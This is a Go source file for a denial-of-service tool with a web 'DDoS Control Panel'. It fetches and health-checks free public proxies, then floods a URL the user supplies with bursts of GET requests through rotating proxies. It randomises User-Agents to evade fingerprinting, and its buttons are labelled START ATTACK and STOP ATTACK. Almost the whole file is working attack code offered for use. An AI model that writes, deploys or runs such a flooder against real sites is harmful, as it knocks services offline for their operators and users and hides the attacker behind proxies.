package main

import (
    "bufio"
    "context"
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    "net/url"
    "os"
    "os/signal"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

// ========== CONFIG ==========
const (
    proxyListURL     = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
    maxProxies       = 50                     // Maximum concurrent proxies in pool
    checkerWorkers   = 100                    // Number of concurrent proxy testers
    checkerTimeout   = 5 * time.Second        // Timeout for testing each proxy
    healthCheckURL   = "http://connectivitycheck.gstatic.com/generate_204"
    reqsPerBurst     = 100
    burstInterval    = 10 * time.Millisecond
    refreshInterval  = 15 * time.Minute
    maxErrorLog      = 20
    proxyTestTimeout = 3 * time.Second        // Timeout for proxy connection test
)

// ========== STRUCTS ==========
type ProxyProtocol int

const (
    Unknown ProxyProtocol = iota
    HTTP
    SOCKS4
    SOCKS5
)

type Proxy struct {
    URL      *url.URL
    Protocol ProxyProtocol
    Healthy  bool
    failures int
    mu       sync.RWMutex
}

type ProxyPool struct {
    proxies []*Proxy
    mu      sync.RWMutex
    next    uint64
}

type AttackStats struct {
    Requests uint64 `json:"requests"`
    Errors   uint64 `json:"errors"`
}

type ErrorEntry struct {
    Time   time.Time `json:"time"`
    Target string    `json:"target"`
    Error  string    `json:"error"`
    Proxy  string    `json:"proxy"`
}

// ========== GLOBAL STATE ==========
var (
    pool           *ProxyPool
    stats          AttackStats
    errorLog       []ErrorEntry
    errorLogMutex  sync.Mutex
    attackActive   bool
    attackCancel   context.CancelFunc
    statsTicker    *time.Ticker
    webClients     = make(map[chan<- AttackStats]bool)
    webClientsLock sync.Mutex
)

// ========== PROXY PARSING ==========
func parseProxyLine(line string) *Proxy {
    line = strings.TrimSpace(line)
    if line == "" {
        return nil
    }

    // Handle different proxy formats
    var proxyURL *url.URL
    var err error

    // If line doesn't have a scheme, try adding http:// as fallback
    if strings.Contains(line, "://") {
        proxyURL, err = url.Parse(line)
    } else {
        proxyURL, err = url.Parse("http://" + line)
    }

    if err != nil {
        return nil
    }

    // Determine protocol
    var protocol ProxyProtocol
    switch proxyURL.Scheme {
    case "http":
        protocol = HTTP
    case "socks4":
        protocol = SOCKS4
    case "socks5":
        protocol = SOCKS5
    default:
        // Treat unknown as HTTP proxy
        protocol = HTTP
        // Fix the scheme
        proxyURL.Scheme = "http"
    }

    return &Proxy{
        URL:      proxyURL,
        Protocol: protocol,
        Healthy:  false,
        failures: 0,
    }
}

// ========== PROXY FETCHING ==========
func fetchProxyList() ([]*Proxy, error) {
    log.Println("Fetching proxy list from Proxifly...")
    resp, err := http.Get(proxyListURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    var proxies []*Proxy
    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        line := scanner.Text()
        if proxy := parseProxyLine(line); proxy != nil {
            proxies = append(proxies, proxy)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    log.Printf("Parsed %d proxies from list", len(proxies))
    return proxies, nil
}

// ========== PROXY HEALTH CHECKER ==========
func testProxy(proxy *Proxy) bool {
    // Create a transport that uses the proxy
    transport := &http.Transport{
        Proxy: http.ProxyURL(proxy.URL),
        DialContext: (&net.Dialer{
            Timeout:   proxyTestTimeout,
            KeepAlive: 0,
        }).DialContext,
        TLSHandshakeTimeout: proxyTestTimeout,
        DisableKeepAlives:   true, // Disable keep-alive for testing
    }

    client := &http.Client{
        Transport: transport,
        Timeout:   proxyTestTimeout,
    }

    // Test with Google connectivity check
    resp, err := client.Get(healthCheckURL)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Consume body to reuse connection
    io.Copy(io.Discard, resp.Body)
    return resp.StatusCode == 204
}

func (p *Proxy) checkHealth() bool {
    healthy := testProxy(p)
    p.mu.Lock()
    defer p.mu.Unlock()
    p.Healthy = healthy
    if healthy {
        p.failures = 0
    } else {
        p.failures++
    }
    return healthy
}

// ========== PROXY POOL MANAGEMENT ==========
func NewProxyPool() *ProxyPool {
    return &ProxyPool{
        proxies: make([]*Proxy, 0),
        next:    0,
    }
}

func (p *ProxyPool) Add(proxy *Proxy) {
    p.mu.Lock()
    defer p.mu.Unlock()
    p.proxies = append(p.proxies, proxy)
}

func (p *ProxyPool) Size() int {
    p.mu.RLock()
    defer p.mu.RUnlock()
    return len(p.proxies)
}

func (p *ProxyPool) GetNext() *Proxy {
    p.mu.RLock()
    defer p.mu.RUnlock()
    if len(p.proxies) == 0 {
        return nil
    }
    idx := atomic.AddUint64(&p.next, 1) % uint64(len(p.proxies))
    proxy := p.proxies[idx]

    // Quick check if it's healthy (lock-free read)
    proxy.mu.RLock()
    healthy := proxy.Healthy
    proxy.mu.RUnlock()

    if !healthy {
        return nil
    }
    return proxy
}

func (p *ProxyPool) RemoveUnhealthy() {
    p.mu.Lock()
    defer p.mu.Unlock()

    var healthy []*Proxy
    for _, proxy := range p.proxies {
        proxy.mu.RLock()
        isHealthy := proxy.Healthy
        failures := proxy.failures
        proxy.mu.RUnlock()

        // Keep if healthy or failures less than 3
        if isHealthy || failures < 3 {
            healthy = append(healthy, proxy)
        }
    }
    p.proxies = healthy
}

// ========== CONCURRENT PROXY CHECKER ==========
func checkProxiesConcurrently(proxies []*Proxy) *ProxyPool {
    log.Printf("Starting concurrent health check with %d workers", checkerWorkers)
    pool := NewProxyPool()
    var wg sync.WaitGroup
    proxyChan := make(chan *Proxy, len(proxies))

    // Start workers
    for i := 0; i < checkerWorkers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for proxy := range proxyChan {
                if proxy.checkHealth() {
                    pool.Add(proxy)
                    log.Printf("✅ Proxy live: %s", proxy.URL.String())
                } else {
                    log.Printf("❌ Proxy dead: %s", proxy.URL.String())
                }
            }
        }()
    }

    // Feed proxies to workers
    for _, proxy := range proxies {
        proxyChan <- proxy
    }
    close(proxyChan)

    wg.Wait()
    log.Printf("Health check complete. Live proxies: %d/%d", pool.Size(), len(proxies))
    return pool
}

// ========== ATTACK ENGINE ==========
func startAttack(target string, duration int) error {
    if attackActive {
        return fmt.Errorf("attack already in progress")
    }

    if pool.Size() == 0 {
        return fmt.Errorf("no healthy proxies available")
    }

    ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
    attackCancel = cancel
    attackActive = true
    atomic.StoreUint64(&stats.Requests, 0)
    atomic.StoreUint64(&stats.Errors, 0)
    errorLog = errorLog[:0]

    go func() {
        defer func() {
            attackActive = false
            broadcastStats()
        }()

        ticker := time.NewTicker(burstInterval)
        defer ticker.Stop()

        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                var wg sync.WaitGroup
                for i := 0; i < reqsPerBurst; i++ {
                    wg.Add(1)
                    go func() {
                        defer wg.Done()
                        if !attackActive {
                            return
                        }
                        proxy := pool.GetNext()
                        if proxy == nil {
                            atomic.AddUint64(&stats.Errors, 1)
                            logError(target, "no healthy proxy", "")
                            return
                        }

                        // Create client with proxy
                        transport := &http.Transport{
                            Proxy: http.ProxyURL(proxy.URL),
                            DialContext: (&net.Dialer{
                                Timeout:   10 * time.Second,
                                KeepAlive: 30 * time.Second,
                            }).DialContext,
                            TLSHandshakeTimeout:   10 * time.Second,
                            ResponseHeaderTimeout: 10 * time.Second,
                            MaxIdleConns:          100,
                            MaxConnsPerHost:        100,
                            IdleConnTimeout:        90 * time.Second,
                        }

                        client := &http.Client{
                            Transport: transport,
                            Timeout:   15 * time.Second,
                        }

                        req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
                        // Add random headers to avoid fingerprinting
                        req.Header.Set("User-Agent", randomUserAgent())
                        req.Header.Set("Accept", "*/*")
                        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
                        req.Header.Set("Cache-Control", "no-cache")

                        resp, err := client.Do(req)
                        if err != nil {
                            atomic.AddUint64(&stats.Errors, 1)
                            logError(target, err.Error(), proxy.URL.String())
                            return
                        }
                        io.Copy(io.Discard, resp.Body)
                        resp.Body.Close()
                        atomic.AddUint64(&stats.Requests, 1)
                    }()
                }
                wg.Wait()
            }
        }
    }()

    statsTicker = time.NewTicker(1 * time.Second)
    go func() {
        for range statsTicker.C {
            broadcastStats()
        }
    }()

    return nil
}

func randomUserAgent() string {
    agents := []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    }
    return agents[time.Now().UnixNano()%int64(len(agents))]
}

func stopAttack() {
    if attackCancel != nil {
        attackCancel()
    }
    if statsTicker != nil {
        statsTicker.Stop()
    }
    attackActive = false
    broadcastStats()
}

func logError(target, errMsg, proxy string) {
    entry := ErrorEntry{
        Time:   time.Now(),
        Target: target,
        Error:  errMsg,
        Proxy:  proxy,
    }
    errorLogMutex.Lock()
    defer errorLogMutex.Unlock()
    errorLog = append([]ErrorEntry{entry}, errorLog...)
    if len(errorLog) > maxErrorLog {
        errorLog = errorLog[:maxErrorLog]
    }
}

func broadcastStats() {
    currentStats := AttackStats{
        Requests: atomic.LoadUint64(&stats.Requests),
        Errors:   atomic.LoadUint64(&stats.Errors),
    }
    webClientsLock.Lock()
    defer webClientsLock.Unlock()
    for ch := range webClients {
        select {
        case ch <- currentStats:
        default:
        }
    }
}

// ========== WEB INTERFACE ==========
func main() {
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt)
    go func() {
        <-sigChan
        cancel()
        os.Exit(0)
    }()

    // Initial proxy fetch and check
    proxies, err := fetchProxyList()
    if err != nil {
        log.Fatal("Failed to fetch proxy list:", err)
    }

    pool = checkProxiesConcurrently(proxies)

    // Background refresh
    go func() {
        ticker := time.NewTicker(refreshInterval)
        defer ticker.Stop()
        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                log.Println("Refreshing proxy list...")
                newProxies, err := fetchProxyList()
                if err != nil {
                    log.Println("Refresh failed:", err)
                    continue
                }
                newPool := checkProxiesConcurrently(newProxies)
                pool = newPool
            }
        }
    }()

    // Periodic cleanup of unhealthy proxies
    go func() {
        ticker := time.NewTicker(5 * time.Minute)
        defer ticker.Stop()
        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                pool.RemoveUnhealthy()
                log.Printf("Proxy pool cleanup: %d proxies remain", pool.Size())
            }
        }
    }()

    http.HandleFunc("/", indexHandler)
    http.HandleFunc("/start", startHandler)
    http.HandleFunc("/stop", stopHandler)
    http.HandleFunc("/stats", statsHandler)
    http.HandleFunc("/proxies", proxiesHandler)

    port := os.Getenv("PORT")
    if port == "" {
        port = "5000"
    }
    log.Printf("Server starting on :%s", port)
    log.Fatal(http.ListenAndServe(":"+port, nil))
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    fmt.Fprint(w, htmlTemplate)
}

func startHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    target := r.FormValue("target")
    durationStr := r.FormValue("duration")
    duration, err := strconv.Atoi(durationStr)
    if err != nil || duration <= 0 {
        http.Error(w, "Invalid duration", http.StatusBadRequest)
        return
    }
    if err := startAttack(target, duration); err != nil {
        http.Error(w, err.Error(), http.StatusInternalServerError)
        return
    }
    w.WriteHeader(http.StatusOK)
}

func stopHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    stopAttack()
    w.WriteHeader(http.StatusOK)
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    flusher, ok := w.(http.Flusher)
    if !ok {
        http.Error(w, "Streaming unsupported", http.StatusInternalServerError)
        return
    }
    w.Header().Set("Cache-Control", "no-cache")
    w.Header().Set("Connection", "keep-alive")

    clientChan := make(chan AttackStats, 1)
    webClientsLock.Lock()
    webClients[clientChan] = true
    webClientsLock.Unlock()

    defer func() {
        webClientsLock.Lock()
        delete(webClients, clientChan)
        webClientsLock.Unlock()
        close(clientChan)
    }()

    initialStats := AttackStats{
        Requests: atomic.LoadUint64(&stats.Requests),
        Errors:   atomic.LoadUint64(&stats.Errors),
    }
    if err := json.NewEncoder(w).Encode(initialStats); err != nil {
        return
    }
    flusher.Flush()

    for {
        select {
        case <-r.Context().Done():
            return
        case newStats := <-clientChan:
            if err := json.NewEncoder(w).Encode(newStats); err != nil {
                return
            }
            flusher.Flush()
        }
    }
}

func proxiesHandler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(map[string]interface{}{
        "total":  pool.Size(),
        "healthy": pool.Size(),
    })
}

const htmlTemplate = `<!DOCTYPE html>
<html>
<head>
    <title>DDoS Control Panel</title>
    <style>
        body { background: white; font-family: Arial, sans-serif; margin: 20px; color: #333; }
        .container { max-width: 1200px; margin: auto; }
        h1 { text-align: center; color: #222; margin-bottom: 30px; }
        .card { border: 1px solid #ccc; padding: 20px; border-radius: 8px; margin-bottom: 20px; background: #f9f9f9; }
        label { display: block; margin: 10px 0 5px; font-weight: bold; }
        input { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        .button-group { display: flex; gap: 10px; margin: 15px 0; }
        button { flex: 1; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        #startBtn { background: #28a745; color: white; }
        #startBtn:hover { background: #218838; }
        #stopBtn { background: #dc3545; color: white; }
        #stopBtn:hover { background: #c82333; }
        .status { padding: 15px; background: #e9ecef; border-radius: 4px; margin: 15px 0; font-size: 18px; text-align: center; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat-box { text-align: center; background: white; padding: 10px; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 30%; }
        .stat-value { font-size: 32px; font-weight: bold; color: #007bff; }
        .stat-label { font-size: 14px; color: #666; }
        .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>DDoS Control Panel</h1>

        <div class="card">
            <div class="status" id="status">Online</div>

            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="reqCount">0</div>
                    <div class="stat-label">Requests</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="errCount">0</div>
                    <div class="stat-label">Errors</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="proxyCount">0</div>
                    <div class="stat-label">Live Proxies</div>
                </div>
            </div>

            <label for="target">Target URL (http:// or https://)</label>
            <input type="url" id="target" placeholder="https://example.com" required>

            <label for="duration">Duration (seconds)</label>
            <input type="number" id="duration" value="60" min="1" max="3600">

            <div class="button-group">
                <button id="startBtn">START ATTACK</button>
                <button id="stopBtn">STOP ATTACK</button>
            </div>

            <div class="footer">
                Proxies from proxifly/free-proxy-list – refreshed every 15 min
            </div>
        </div>
    </div>

    <script>
        let statusInterval;

        async function updateStatus() {
            try {
                const [statsRes, proxiesRes] = await Promise.all([
                    fetch('/stats'),
                    fetch('/proxies')
                ]);
                const stats = await statsRes.json();
                const proxies = await proxiesRes.json();
                document.getElementById('status').innerText = stats.requests > 0 ? 'Attacking' : 'Online';
                document.getElementById('reqCount').innerText = stats.requests;
                document.getElementById('errCount').innerText = stats.errors;
                document.getElementById('proxyCount').innerText = proxies.healthy;
            } catch (err) {
                console.error('Stats error:', err);
            }
        }

        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = parseInt(document.getElementById('duration').value);
            if (!target) return alert('Please enter a target URL');

            const formData = new FormData();
            formData.append('target', target);
            formData.append('duration', duration);

            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    body: formData
                });
                if (!res.ok) {
                    const text = await res.text();
                    alert('Error: ' + text);
                }
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch('/stop', { method: 'POST' });
            } catch (err) {
                alert('Network error: ' + err.message);
            }
        }

        document.getElementById('startBtn').addEventListener('click', startAttack);
        document.getElementById('stopBtn').addEventListener('click', stopAttack);
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>`
